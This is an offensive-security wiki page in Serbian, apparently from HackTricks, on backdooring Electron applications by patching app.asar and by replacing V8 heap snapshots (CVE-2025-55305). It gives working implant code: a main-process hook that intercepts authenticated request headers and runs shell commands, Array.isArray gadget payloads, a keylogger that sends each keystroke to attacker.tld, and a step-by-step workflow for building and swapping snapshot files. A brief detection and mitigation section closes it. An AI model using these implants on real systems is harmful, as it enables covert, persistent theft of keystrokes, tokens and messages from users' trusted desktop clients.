# Lokalna injekcija koda u Electron-u i neovlašćena izmena snapshot-a

{{#include ../../banners/hacktricks-training.md}}

## Lokalna injekcija koda u Electron-u

Ako možete da izmenite ili instrumentirate lokalno instaliranu Electron aplikaciju, možda ćete moći da je navedete da izvršava proizvoljan JavaScript. Pogledajte:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Za lokalni Node inspector ili Chromium DevTools debugging površinu pogledajte [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: ASAR/main-process implantati

Ako dobijete **pristup za upis** u direktorijum sa resursima Electron aplikacije, vrlo praktičan post-exploitation način delovanja jeste da **patch-ujete `app.asar`** (ili JS entrypoint koji se učitava) i sačekate da korisnik ponovo pokrene aplikaciju. Za razliku od XSS-a ograničenog samo na renderer, kod učitan iz **main process-a** izvršava se u **Node.js runtime-u** aplikacije, pa obično može da pristupi **filesystem-u**, pokreće komande, presreće Electron API-je i pregleda stanje autentifikovane aplikacije.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Tipičan postupak:

1. Raspakujte `app.asar` i pronađite stvarnu bootstrap datoteku u `package.json` (`main`) ili u postojećoj startup logici.
2. Dodajte mali loader u **main process** (ili preload/main-process hook) i ponovo zapakujte arhivu.
3. Sačekajte da se aplikacija ponovo pokrene i upotrebite implant za prikupljanje podataka tokom runtime-a, nakon što korisnik otključa desktop aplikaciju ili se autentifikuje u njoj.

Primer minimalne bootstrap izmene:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Praktične posledice:

- **Krađa podataka iz pouzdanog klijenta**: kada desktop aplikacija dešifruje ili učita korisnikove podatke, implant može da ih pročita iz runtime okruženja. Zato su **E2EE klijenti za razmenu poruka** (Signal/Slack/Mattermost) i **menadžeri trezora/tajni** i dalje zanimljive mete na nivou krajnje tačke.
- **Zloupotreba sesije/tokena**: Electron implant može da ukrade kolačiće aplikacije, bearer tokene, zaglavlja zahteva, workspace fajlove ili akreditive za repo kojima klijent koji je pokrenut ima pristup (na primer, iz autentifikovanih VS Code ekstenzija ili Git integracija).
- **Pivotiranje kroz kontekst žrtve**: izmenjena aplikacija može da prosleđuje zahteve preko radne stanice žrtve, koristeći IP adresu žrtve, TLS otisak i sesiju aplikacije, umesto da samo eksfiltrira sirove tokene.

> [!NOTE]
> Ako cilj koristi **ASAR integrity** / **OnlyLoadAppFromAsar** ili ojačane Electron **fuses**, možda će vam biti potreban drugi primitiv za lokalno učitavanje koda (na primer, zloupotreba fuse mehanizma ili snapshot tampering). Više lokalnih opcija za implant i detalje o fuse mehanizmu potražite na stranici o macOS-specifičnoj injekciji.

## Lokalno ubacivanje backdoor-a izmenom V8 heap snapshot-a (Electron/Chromium) – CVE-2025-55305

Aplikacije zasnovane na Electron-u i Chromium-u deserijalizuju unapred izgrađen V8 heap snapshot pri pokretanju (v8_context_snapshot.bin, i opciono browser_v8_context_snapshot.bin) da bi inicijalizovale svaki V8 isolate (main, preload, renderer). Istorijski gledano, Electron-ovi integrity fuses nisu tretirali ove snapshot-e kao izvršni sadržaj, pa su izbegavali i primenu integriteta zasnovanu na fuse mehanizmu i provere potpisivanja koda operativnog sistema. Zbog toga je zamena snapshot-a u instalaciji u koju korisnik može da upisuje omogućavala prikriveno, postojano izvršavanje koda unutar aplikacije, bez izmene potpisanih binarnih datoteka ili ASAR-a.<sup>[[2]](#references)</sup>

Ključne tačke
- Nedostatak provere integriteta: EnableEmbeddedAsarIntegrityValidation i OnlyLoadAppFromAsar proveravaju JavaScript aplikacije unutar ASAR-a, ali nisu obuhvatali V8 heap snapshot-e (CVE-2025-55305). Chromium takođe ne proverava integritet snapshot-a.<sup>[[3]](#references)[[4]](#references)</sup>
- Preduslovi napada: lokalni upis fajla u instalacioni direktorijum aplikacije. Ovo je uobičajeno na sistemima na kojima su Electron aplikacije ili Chromium pregledači instalirani na putanje u koje korisnik može da upisuje (npr. %AppData%\Local na Windows-u; /Applications uz određena ograničenja na macOS-u).
- Efekat: pouzdano izvršavanje JavaScript-a napadača u bilo kom isolate-u tako što se zameni često korišćeni ugrađeni element („gadget“), čime se omogućavaju postojanost i zaobilaženje provere potpisivanja koda.
- Površina napada: Electron aplikacije (čak i kada su fuses uključeni) i Chromium pregledači koji učitavaju snapshot-e sa lokacija u koje korisnik može da upisuje.

Generisanje zlonamernog snapshot-a bez izgradnje Chromium-a
- Upotrebite unapred izgrađeni electron/mksnapshot da kompajlirate payload JS u snapshot, pa zamenite v8_context_snapshot.bin aplikacije.<sup>[[5]](#references)[[6]](#references)</sup>

Primer minimalnog payload-a (dokažite izvršavanje izazivanjem pada)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-aware payload routing (pokretanje različitog koda u main procesu i rendereru)
- Detekcija main procesa: Globalne promenljive dostupne samo u Node.js okruženju, kao što su process.pid, process.binding() ili process.dlopen, prisutne su u isolate-u main procesa.
- Detekcija browser/renderer okruženja: Globalne promenljive dostupne samo u browseru, kao što je alert, dostupne su pri pokretanju u kontekstu dokumenta.

Primer gadgeta koji jednom proverava Node mogućnosti main procesa
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC za krađu podataka iz renderer/browser-context okruženja (npr. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Tok rada operatera
1) Napišite payload.js koji prepisuje uobičajeni ugrađeni objekat (npr. Array.isArray) i po želji se grana u zavisnosti od isolate-a.
2) Izgradite snapshot bez Chromium izvornog koda:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Zamenite datoteke snapshot-a ciljne aplikacije:
   - v8_context_snapshot.bin (uvek se koristi)
   - browser_v8_context_snapshot.bin (ako se koristi LoadBrowserProcessSpecificV8Snapshot fuse)
4) Pokrenite aplikaciju; gadget se izvršava svaki put kada se upotrebi izabrani ugrađeni objekat.

Napomene i razmatranja
- Zaobilaženje provera integriteta/potpisa: Provere potpisivanja koda ne tretiraju datoteke snapshot-a kao izvorne izvršne datoteke, a one (istorijski) nisu bile obuhvaćene ni Electron fuse-ovima ni Chromium kontrolama integriteta.
- Postojanost: Zamena snapshot-a u instalaciji u koju korisnik može da upisuje obično opstaje nakon ponovnog pokretanja aplikacije i izgleda kao potpisana, legitimna aplikacija.
- Chromium pregledači: Isti koncept neovlašćenog menjanja primenjuje se na Chrome i izvedene verzije instalirane na lokacijama u koje korisnik može da upisuje. Chrome ima i druge mere za ublažavanje problema sa integritetom, ali izričito isključuje fizički lokalne napade iz svog modela pretnji.<sup>[[9]](#references)[[10]](#references)</sup>

Otkrivanje i mere za ublažavanje
- Tretirajte snapshot-e kao izvršni sadržaj i uključite ih u sprovođenje provera integriteta (ispravka za CVE-2025-55305).
- Dajte prednost lokacijama za instalaciju u koje mogu da upisuju samo administratori; napravite osnovnu referentnu vrednost i nadgledajte hash vrednosti za v8_context_snapshot.bin i browser_v8_context_snapshot.bin.
- Otkrivajte prepisivanje ugrađenih objekata u ranoj fazi izvršavanja i neočekivane promene snapshot-a; izdajite upozorenje kada deserijalizovani snapshot-i ne odgovaraju očekivanim vrednostima.

## References

- [1] [JS-Tap v3: Eksploatacija krajnjih tačaka nakon kompromitovanja pomoću JavaScript implantata](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Potkopavanje provera integriteta koda radi lokalnog postavljanja backdoor-a u Signal, 1Password, Slack i druge aplikacije](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron fuse-ovi](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron ASAR integritet](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 prilagođeni početni snapshot-i](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Onemogućavanje učitavanja nepotpisanog koda (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Česta pitanja o bezbednosti Chrome-a: fizički lokalni napadi su van opsega](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
